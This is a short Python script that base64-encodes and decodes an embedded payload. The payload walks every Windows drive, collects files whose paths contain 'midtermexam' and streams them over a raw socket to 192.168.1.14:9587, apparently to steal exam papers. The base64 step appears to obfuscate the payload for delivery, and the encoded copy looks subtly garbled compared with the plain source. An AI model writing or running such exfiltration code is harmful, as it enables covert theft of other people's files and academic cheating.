import base64

encode = """
# -*- coding: utf-8 -*-
import os
import re
import socket
import hashlib
import time

drives = os.popen('wmic logicaldisk get caption')
drives = [drive.strip() for drive in drives if drive.strip()]
exam_file_list = []
for drive in drives:
    path = os.path.join(drive, "\\\\")
    for dirPath, dirNames, fileNames in os.walk(path):
        for file in fileNames:
            if re.search("midtermexam", os.path.join(dirPath, file)) and not file.endswith('.lnk'):
                exam_file_list.append(os.path.join(dirPath, file))
exam_file_list = [elem for elem in exam_file_list if not elem.startswith('\\\\')]
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect(("192.168.1.14", 9587))
hash_dict = {}
for exam_file in exam_file_list:
    with open(exam_file, "rb") as f:
        md5 = hashlib.md5(f.read()).hexdigest()
    if md5 in hash_dict:
        continue
    file_size = os.path.getsize(exam_file)
    client_socket.sendall(f"{os.path.basename(exam_file)}\\n{file_size}".encode())
    with open(exam_file, "rb") as f:
        while True:
            data = f.read(1048576)
            if not data:
                break
            client_socket.sendall(data)
            time.sleep(3)
    hash_dict[md5] = exam_file
client_socket.sendall(b"over")
client_socket.close()
"""

# Convert code to bytes and encode using Base64
blob = base64.b64encode(encode.encode('utf-8')).decode('utf-8')
# Print the encoded string
print(blob)

decode = "CiMgLSotIGNvZGluZzogdXRmLTggLSotCmltcG9ydCBvcwppbXBvcnQgcmUKaW1wb3J0IHNvY2tldAppbXBvcnQgaGFzaGxpYgppbXBvcnQgdGltZQoKZHJpdmVzID0gb3MucG9wZW4oJ3dtaWMgbG9naWNhbGRpc2sgZ2V0IGNhcHRpb24nKQpkcml2ZXMgPSBbZHJpdmUuc3RyaXAoKSBmb3IgZHJpdmUgaW4gZHJpdmVzIGlmIGRyaXZlLnN0cmlwKCldCmV4YW1fZmlsZV9saXN0ID0gW10KZm9yIGRyaXZlIGluIGRyaXZlczoKICAgIHBhdGggPSBvcy5wYXRoLmpvaW4oZHJpdmUsICJcXCIpCiAgICBmb3IgZGlyUGF0aCwgZGlyTmFtZXMsIGZpbGVOYW1lcyBpbiBvcy53YWxrKHBhdGgiKToKICAgICAgICBmb3IgZmlsZSBpbiBmaWxlTmFtZXM6CiAgICAgICAgICAgIGlmIHJlLnNlYXJjaCgibWlkdGVybWV4YW0iLCBvcy5wYXRoLmpvaW4oZGlyUGF0aCwgZmlsZSkpIGFuZCBub3QgZmlsZS5lbmRzd2l0aCgnLmxuaycpOgogICAgICAgICAgICAgICAgZXhhbV9maWxlX2xpc3QuYXBwZW5kKG9zLnBhdGguam9pbihkaXJQYXRoLCBmaWxlKSkKZXhhbV9maWxlX2xpc3QgPSBbZWxlbSBmb3IgZWxlbSBpbiBleGFtX2ZpbGVfbGlzdCBpZiBub3QgZWxlbS5zdGFydHN3aXRoKCdcXCcpXQpoYXNoX2RpY3QgPSB7fQpjbGllbnRfc29ja2V0ID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKQpjbGllbnRfc29ja2V0LmNvbm5lY3QoKCIxOTIuMTY4LjEuMTQiLCA5NTg3KSkKZm9yIGV4YW1fZmlsZSBpbiBleGFtX2ZpbGVfbGlzdDoKICAgIHdpdGggb3BlbihleGFtX2ZpbGUsICJyYiIpIGFzIGY6CiAgICAgICAgbWQ1ID0gaGFzaGxpYi5tZDUoZi5yZWFkKCkpLmhleGRpZ2VzdCgpCiAgICBpZiBtZDUgaW4gaGFzaF9kaWN0OgogICAgICAgIGNvbnRpbnVlCiAgICBmaWxlX3NpemUgPSBvcy5wYXRoLmdldHNpemUoZXhhbV9maWxlKQogICAgY2xpZW50X3NvY2tldC5zZW5kYWxsKGYie29zLnBhdGguYmFzZW5hbWUoZXhhbV9maWxlKX1cbntmaWxlX3NpemV9Ii5lbmNvZGUoKSkKICAgIHdpdGggb3BlbihleGFtX2ZpbGUsICJyYiIpIGFzIGY6CiAgICAgICAgd2hpbGUgVHJ1ZToKICAgICAgICAgICAgZGF0YSA9IGYucmVhZCgxMDQ4NTc2KQogICAgICAgICAgICBpZiBub3QgZGF0YToKICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgIGNsaWVudF9zb2NrZXQuc2VuZGFsbChkYXRhKQogICAgICAgICAgICB0aW1lLnNsZWVwKDMpCiAgICBoYXNoX2RpY3RbbWQ1XSA9IGV4YW1fZmlsZQpjbGllbnRfc29ja2V0LnNlbmRhbGwoYiJvdmVyIikKY2xpZW50X3NvY2tldC5jbG9zZSgpCg=="
decoded = base64.b64decode(decode).decode("UTF-8")
print(decoded)
